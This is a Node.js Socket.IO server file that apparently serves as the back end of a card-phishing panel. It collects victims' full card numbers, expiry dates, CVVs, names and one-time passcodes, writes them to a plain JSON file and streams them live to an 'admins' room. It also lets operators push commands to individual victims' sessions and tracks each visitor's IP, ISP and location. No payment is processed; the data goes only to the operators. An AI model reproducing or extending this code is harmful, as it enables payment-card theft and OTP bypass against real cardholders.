const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// Enhanced CORS configuration for production
app.use(cors({
  origin: ['https://dev49.onrender.com', 'http://localhost:8080', 'http://localhost:5173'],
  credentials: true
}));

const port = process.env.PORT || 8080;
const server = http.createServer(app);

// Enhanced Socket.IO configuration with better error handling
const io = new Server(server, {
  cors: {
    origin: ['https://dev49.onrender.com', 'http://localhost:8080', 'http://localhost:5173'],
    methods: ['GET', 'POST'],
    credentials: true
  },
  upgradeTimeout: 30000,
  transports: ['polling', 'websocket'],
  pingTimeout: 60000,
  pingInterval: 25000,
  maxHttpBufferSize: 1e6, // Limit message size to prevent parser errors
  allowEIO3: true
});

// Middleware for parsing JSON with size limits
app.use(express.json({ limit: '1mb' }));

// Enhanced in-memory storage with better data structures
const submissionsFilePath = path.join(__dirname, 'submissions.json');
let cardSubmissionsQueue = [];

// Use Map for better performance with high traffic
const activeVisitors = new Map();
const connectionCounts = new Map(); // Track connections per IP
const rateLimitMap = new Map(); // Rate limiting

// Enhanced rate limiting function
const isRateLimited = (ip) => {
  const now = Date.now();
  const windowSize = 60000; // 1 minute window
  const maxRequests = 100; // Max 100 requests per minute per IP
  
  if (!rateLimitMap.has(ip)) {
    rateLimitMap.set(ip, { count: 1, firstRequest: now });
    return false;
  }
  
  const record = rateLimitMap.get(ip);
  
  if (now - record.firstRequest > windowSize) {
    // Reset window
    rateLimitMap.set(ip, { count: 1, firstRequest: now });
    return false;
  }
  
  record.count++;
  return record.count > maxRequests;
};

// Function to load submissions from file with error handling
const loadSubmissions = () => {
  try {
    if (fs.existsSync(submissionsFilePath)) {
      const data = fs.readFileSync(submissionsFilePath, 'utf8');
      const parsed = JSON.parse(data);
      cardSubmissionsQueue = Array.isArray(parsed) ? parsed : [];
      console.log(`[Server] Loaded ${cardSubmissionsQueue.length} submissions from file.`);
    }
  } catch (error) {
    console.error('[Server] Error loading submissions from file:', error);
    cardSubmissionsQueue = []; // Reset to empty array on error
  }
};

// Function to save submissions to file with error handling
const saveSubmissions = () => {
  try {
    // Limit submissions to prevent memory issues
    const maxSubmissions = 1000;
    if (cardSubmissionsQueue.length > maxSubmissions) {
      cardSubmissionsQueue = cardSubmissionsQueue.slice(0, maxSubmissions);
    }
    
    fs.writeFileSync(submissionsFilePath, JSON.stringify(cardSubmissionsQueue, null, 2), 'utf8');
    console.log('[Server] Submissions saved to file.');
  } catch (error) {
    console.error('[Server] Error saving submissions to file:', error);
  }
};

// Enhanced function to get client IP address
const getClientIP = (socket) => {
  try {
    const forwarded = socket.handshake.headers['x-forwarded-for'];
    const realIp = socket.handshake.headers['x-real-ip'];
    const cfConnectingIp = socket.handshake.headers['cf-connecting-ip'];
    const remoteAddress = socket.conn.remoteAddress;
    const handshakeAddress = socket.handshake.address;
    
    let ip = 'Unknown';
    
    if (cfConnectingIp) {
      ip = cfConnectingIp;
    } else if (forwarded) {
      ip = forwarded.split(',')[0].trim();
    } else if (realIp) {
      ip = realIp;
    } else if (remoteAddress) {
      ip = remoteAddress.replace('::ffff:', '');
    } else if (handshakeAddress) {
      ip = handshakeAddress.replace('::ffff:', '');
    }
    
    // Clean up common localhost variations
    if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
      ip = '127.0.0.1';
    }
    
    return ip;
  } catch (error) {
    console.error('[Server] Error getting client IP:', error);
    return 'Unknown';
  }
};

// Enhanced location data function with caching
const locationCache = new Map();
const getLocationData = async (ip) => {
  // Check cache first
  if (locationCache.has(ip)) {
    return locationCache.get(ip);
  }
  
  // For localhost/development, return local data
  if (ip === '127.0.0.1' || ip === 'localhost' || ip === '::1' || ip === 'Unknown') {
    const localData = {
      isp: 'Local Development',
      country: 'Localhost',
      country_flag: '💻'
    };
    locationCache.set(ip, localData);
    return localData;
  }
  
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000); // 5 second timeout
    
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,isp,org,query`, {
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    
    const data = await response.json();
    
    if (data.status === 'success') {
      const countryCode = data.countryCode;
      const flagEmoji = countryCode ? getCountryFlag(countryCode) : '🌍';
      
      const locationData = {
        isp: data.isp || data.org || 'Unknown ISP',
        country: data.country || 'Unknown',
        country_flag: flagEmoji
      };
      
      // Cache the result
      locationCache.set(ip, locationData);
      return locationData;
    } else {
      throw new Error('API failed');
    }
  } catch (error) {
    console.error(`[Server] Error fetching location data for IP ${ip}:`, error.message);
    const fallbackData = {
      isp: 'Unknown ISP',
      country: 'Unknown Location',
      country_flag: '🌍'
    };
    locationCache.set(ip, fallbackData);
    return fallbackData;
  }
};

// Function to convert country code to flag emoji
const getCountryFlag = (countryCode) => {
  try {
    if (!countryCode || countryCode.length !== 2) return '🌍';
    
    const codePoints = countryCode
      .toUpperCase()
      .split('')
      .map(char => 127397 + char.charCodeAt());
    
    return String.fromCodePoint(...codePoints);
  } catch (error) {
    return '🌍';
  }
};

// Load submissions when the server starts
loadSubmissions();

// Enhanced cleanup with better performance
setInterval(() => {
  const now = Date.now();
  const inactiveThreshold = 2 * 60 * 1000; // 2 minutes
  const toRemove = [];
  
  // Clean up inactive visitors
  for (const [socketId, visitor] of activeVisitors.entries()) {
    if (now - visitor.lastSeen > inactiveThreshold) {
      toRemove.push(socketId);
    }
  }
  
  // Remove inactive visitors
  toRemove.forEach(socketId => {
    activeVisitors.delete(socketId);
    io.emit('visitor_left', { id: socketId });
  });
  
  // Clean up rate limit map
  for (const [ip, record] of rateLimitMap.entries()) {
    if (now - record.firstRequest > 60000) {
      rateLimitMap.delete(ip);
    }
  }
  
  // Clean up location cache (keep only recent entries)
  if (locationCache.size > 500) {
    const entries = Array.from(locationCache.entries());
    locationCache.clear();
    // Keep only last 250 entries
    entries.slice(-250).forEach(([key, value]) => {
      locationCache.set(key, value);
    });
  }
  
  if (toRemove.length > 0) {
    console.log(`[Server] Cleaned up ${toRemove.length} inactive visitors`);
  }
}, 30000); // Check every 30 seconds

// Enhanced connection handling with rate limiting
io.on('connection', async (socket) => {
  try {
    const clientIp = getClientIP(socket);
    
    // Rate limiting check
    if (isRateLimited(clientIp)) {
      console.log(`[Server] Rate limited connection from ${clientIp}`);
      socket.emit('error', 'Rate limit exceeded');
      socket.disconnect(true);
      return;
    }
    
    console.log(`[Server] Socket.IO connection established: ${socket.id} from ${clientIp}`);
    
    // Track connection count per IP
    const currentCount = connectionCounts.get(clientIp) || 0;
    connectionCounts.set(clientIp, currentCount + 1);
    
    // Limit connections per IP (max 10 per IP)
    if (currentCount > 10) {
      console.log(`[Server] Too many connections from ${clientIp}`);
      socket.disconnect(true);
      return;
    }
    
    // Check if visitor with same IP already exists
    let existingVisitorKey = null;
    for (const [socketId, visitor] of activeVisitors.entries()) {
      if (visitor.ip === clientIp && socketId !== socket.id) {
        existingVisitorKey = socketId;
        break;
      }
    }
    
    // Remove existing visitor if found
    if (existingVisitorKey) {
      activeVisitors.delete(existingVisitorKey);
      io.emit('visitor_left', { id: existingVisitorKey });
    }
    
    // Fetch location data with timeout
    const locationData = await getLocationData(clientIp);
    
    // Create visitor object
    const visitor = {
      id: socket.id,
      ip: clientIp,
      user_agent: socket.handshake.headers['user-agent'] || 'Unknown',
      device_time: new Date().toLocaleString(),
      created_at: new Date().toISOString(),
      lastSeen: Date.now(),
      ...locationData
    };
    
    // Store visitor
    activeVisitors.set(socket.id, visitor);
    
    // Broadcast to admins only (not to all sockets to reduce traffic)
    io.to('admins').emit('visitor_update', visitor);
    io.to('admins').emit('enhanced_visitor', visitor);
    
    // Enhanced disconnect handling
    socket.on('disconnect', (reason) => {
      try {
        console.log(`[Server] Socket.IO disconnected: ${socket.id}, reason: ${reason}`);
        activeVisitors.delete(socket.id);
        
        // Update connection count
        const count = connectionCounts.get(clientIp) || 1;
        if (count <= 1) {
          connectionCounts.delete(clientIp);
        } else {
          connectionCounts.set(clientIp, count - 1);
        }
        
        io.to('admins').emit('visitor_left', { id: socket.id });
      } catch (error) {
        console.error('[Server] Error handling disconnect:', error);
      }
    });

    // Enhanced visitor connected handler
    socket.on('visitor_connected', async (payload) => {
      try {
        if (!payload || typeof payload !== 'object') {
          console.warn('[Server] Invalid visitor_connected payload');
          return;
        }
        
        const freshLocationData = await getLocationData(clientIp);
        
        if (activeVisitors.has(socket.id)) {
          const existingVisitor = activeVisitors.get(socket.id);
          const updatedVisitor = {
            ...existingVisitor,
            ...payload,
            ...freshLocationData,
            ip: clientIp,
            lastSeen: Date.now()
          };
          activeVisitors.set(socket.id, updatedVisitor);
          
          io.to('admins').emit('visitor_update', updatedVisitor);
          io.to('admins').emit('enhanced_visitor', updatedVisitor);
        }
      } catch (error) {
        console.error('[Server] Error handling visitor_connected:', error);
      }
    });

    // Enhanced admin hello handler
    socket.on('admin_hello', () => {
      try {
        socket.join('admins');
        console.log(`[Server] Admin connected: ${socket.id}`);

        // Send submissions in batches to prevent overwhelming
        const batchSize = 50;
        for (let i = 0; i < cardSubmissionsQueue.length; i += batchSize) {
          const batch = cardSubmissionsQueue.slice(i, i + batchSize);
          setTimeout(() => {
            batch.forEach(submission => {
              socket.emit('card_submission', submission);
            });
          }, i / batchSize * 100); // Stagger batches
        }
        
        // Send visitors in batches
        const visitorArray = Array.from(activeVisitors.values());
        for (let i = 0; i < visitorArray.length; i += batchSize) {
          const batch = visitorArray.slice(i, i + batchSize);
          setTimeout(() => {
            batch.forEach(visitor => {
              socket.emit('visitor_update', visitor);
              socket.emit('enhanced_visitor', visitor);
            });
          }, (i / batchSize * 100) + 1000); // Stagger after submissions
        }
        
        console.log(`[Server] Sent ${cardSubmissionsQueue.length} submissions and ${visitorArray.length} visitors to admin`);
      } catch (error) {
        console.error('[Server] Error handling admin_hello:', error);
      }
    });

    // Enhanced card submission handler with validation
    socket.on('card_submission', (payload) => {
      try {
        if (!payload || typeof payload !== 'object') {
          console.error('[Server] Invalid card submission payload');
          socket.emit('submission_error', { error: 'Invalid payload' });
          return;
        }

        // Validate required fields
        const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
        const missingFields = requiredFields.filter(field => !payload[field]);
        
        if (missingFields.length > 0) {
          console.error('[Server] Missing required fields:', missingFields);
          socket.emit('submission_error', { error: 'Missing required fields', fields: missingFields });
          return;
        }

        // Sanitize and validate data
        const submissionPayload = {
          id: socket.id,
          socket_id: socket.id,
          card_number: String(payload.card_number).substring(0, 20),
          expiry_month: String(payload.expiry_month).substring(0, 2),
          expiry_year: String(payload.expiry_year).substring(0, 4),
          cvv: String(payload.cvv).substring(0, 4),
          card_holder: String(payload.card_holder).substring(0, 100),
          amount: String(payload.amount).substring(0, 20),
          user_ip: clientIp,
          created_at: new Date().toISOString(),
          status: 'pending'
        };

        // Add card type detection
        const cardNumber = submissionPayload.card_number.replace(/\s/g, '');
        submissionPayload.card_type = detectCardType(cardNumber);

        // Add to queue with size limit
        cardSubmissionsQueue.unshift(submissionPayload);
        if (cardSubmissionsQueue.length > 1000) {
          cardSubmissionsQueue = cardSubmissionsQueue.slice(0, 1000);
        }

        // Save asynchronously to prevent blocking
        setImmediate(() => saveSubmissions());

        console.log(`[Server] Card submission processed. Queue size: ${cardSubmissionsQueue.length}`);

        // Broadcast to admins only
        io.to('admins').emit('card_submission', submissionPayload);
        
        // Send confirmation
        socket.emit('submission_received', { id: socket.id, status: 'received' });
      } catch (error) {
        console.error('[Server] Error handling card submission:', error);
        socket.emit('submission_error', { error: 'Processing failed' });
      }
    });

    // Helper function to detect card type
    function detectCardType(cardNumber) {
      try {
        if (cardNumber.startsWith('4')) return 'Visa';
        if (cardNumber.startsWith('5')) return 'MasterCard';
        if (cardNumber.startsWith('6')) return 'Discover';
        if (cardNumber.startsWith('3')) return 'American Express';
        return 'Unknown';
      } catch (error) {
        return 'Unknown';
      }
    }

    // Enhanced admin command handler
    socket.on('admin_command', (payload) => {
      try {
        if (!payload || typeof payload !== 'object') {
          console.warn('[Server] Invalid admin command payload');
          return;
        }

        console.log(`[Server] Admin command received:`, payload);
        io.to('admins').emit('admin_command', payload);

        const targetSocketId = payload.submission_id;
        if (targetSocketId) {
          const targetSocket = io.sockets.sockets.get(targetSocketId);
          if (targetSocket) {
            console.log(`[Server] Sending command to target socket: ${targetSocketId}`);
            targetSocket.emit('admin_command', payload);
          } else {
            console.log(`[Server] Target socket ${targetSocketId} not found`);
          }
        }
      } catch (error) {
        console.error('[Server] Error handling admin command:', error);
      }
    });

    // Enhanced OTP handler
    socket.on('otp_submitted', (payload) => {
      try {
        if (!payload || typeof payload !== 'object' || !payload.submission_id || !payload.otp) {
          console.warn('[Server] Invalid OTP submission');
          return;
        }

        console.log(`[Server] Received otp_submitted from ${socket.id} for submission_id: ${payload.submission_id}`);
        const otpPayload = {
          submission_id: payload.submission_id,
          otp: String(payload.otp).substring(0, 10), // Sanitize OTP
          timestamp: new Date().toISOString()
        };
        io.to('admins').emit('otp_submitted', otpPayload);
      } catch (error) {
        console.error('[Server] Error handling OTP submission:', error);
      }
    });

    // Enhanced chat handlers
    socket.on('chat_message', (payload) => {
      try {
        if (!payload || typeof payload !== 'object') return;
        
        const sanitizedPayload = {
          ...payload,
          message: String(payload.message || '').substring(0, 500), // Limit message length
          timestamp: new Date().toISOString()
        };
        io.emit('chat_message', sanitizedPayload);
      } catch (error) {
        console.error('[Server] Error handling chat message:', error);
      }
    });

    socket.on('start_chat', (payload) => {
      try {
        if (!payload || typeof payload !== 'object') return;
        io.emit('start_chat', payload);
      } catch (error) {
        console.error('[Server] Error handling start chat:', error);
      }
    });

    // Update last seen time on any activity
    socket.onAny(() => {
      try {
        if (activeVisitors.has(socket.id)) {
          const visitor = activeVisitors.get(socket.id);
          visitor.lastSeen = Date.now();
          activeVisitors.set(socket.id, visitor);
        }
      } catch (error) {
        console.error('[Server] Error updating last seen:', error);
      }
    });

  } catch (error) {
    console.error('[Server] Error in connection handler:', error);
    socket.disconnect(true);
  }
});

// Serve static files from the dist directory (built React app)
const distPath = path.join(__dirname, 'dist');
console.log('[Server] Serving static files from:', distPath);

// Check if dist directory exists
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath, {
    maxAge: '1y',
    etag: false
  }));
  console.log('[Server] Static files configured successfully');
} else {
  console.warn('[Server] Warning: dist directory not found at:', distPath);
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    visitors: activeVisitors.size,
    submissions: cardSubmissionsQueue.length
  });
});

// API endpoint for submissions (if needed)
app.get('/api/submissions', (req, res) => {
  res.json({ count: cardSubmissionsQueue.length });
});

// Catch-all handler: send back React's index.html file for client-side routing
app.get('*', (req, res) => {
  const indexPath = path.join(distPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.status(404).send('Application not built. Please run build process.');
  }
});

// Enhanced error handling
server.on('error', (error) => {
  console.error('[Server] Server error:', error);
});

server.on('upgrade', (req, socket, head) => {
  console.log('[Server] HTTP Upgrade request received:', req.url);
});

// Graceful shutdown with cleanup
process.on('SIGTERM', () => {
  console.log('[Server] SIGTERM received, shutting down gracefully');
  saveSubmissions();
  server.close(() => {
    console.log('[Server] Process terminated');
  });
});

process.on('SIGINT', () => {
  console.log('[Server] SIGINT received, shutting down gracefully');
  saveSubmissions();
  server.close(() => {
    console.log('[Server] Process terminated');
  });
});

// Start server with enhanced error handling
server.listen(port, '0.0.0.0', () => {
  console.log(`[Server] Server is running on port ${port}`);
  console.log(`[Server] Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`[Server] Memory usage: ${Math.round(process.memoryUsage().heapUsed / 1024 / 1024)} MB`);
});

// Monitor memory usage
setInterval(() => {
  const memUsage = process.memoryUsage();
  const heapUsed = Math.round(memUsage.heapUsed / 1024 / 1024);
  if (heapUsed > 500) { // If using more than 500MB
    console.log(`[Server] High memory usage: ${heapUsed} MB`);
  }
}, 60000); // Check every minute
